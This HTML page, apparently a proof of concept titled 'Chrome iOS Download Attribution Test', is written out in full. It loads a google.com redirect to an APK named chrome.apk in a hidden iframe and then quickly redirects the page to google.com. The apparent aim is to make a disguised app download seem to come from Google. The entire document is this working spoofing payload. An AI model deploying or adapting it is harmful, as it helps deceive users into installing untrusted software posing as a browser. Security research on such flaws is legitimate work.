<!doctype html>
<html>
<head>
<meta charset="utf-8">

<style>
body{
  font-family:Arial;
  text-align:center;
  margin-top:120px;
}

.button{
  background:#4CAF50;
  border:none;
  color:white;
  padding:16px 36px;
  font-size:18px;
  cursor:pointer;
}

#frame{
  display:none;
  width:0;
  height:0;
  border:0;
}
</style>

</head>

<body>

<h2>Chrome iOS Download Attribution Test</h2>

<br>

<button class="button" onclick="startTest()">
Click here
</button>

<iframe id="frame"></iframe>

<script>

function startTest(){

  const frame=document.getElementById("frame");

  // URL google redirect → file asli
  const downloadURL="https://www.google.com/url?q=https%3A%2F%2Fecdnts-del.github.io%2Ftest-apk%2Fchrome.apk";

  // trigger download lewat iframe
  frame.src=downloadURL;

  // tampilkan iframe setelah beberapa detik
  setTimeout(()=>{
    frame.style.display="block";
  },3500);

  // redirect cepat
  setTimeout(()=>{
    window.location.href="https://google.com";
  },220);

}

</script>

</body>
</html>
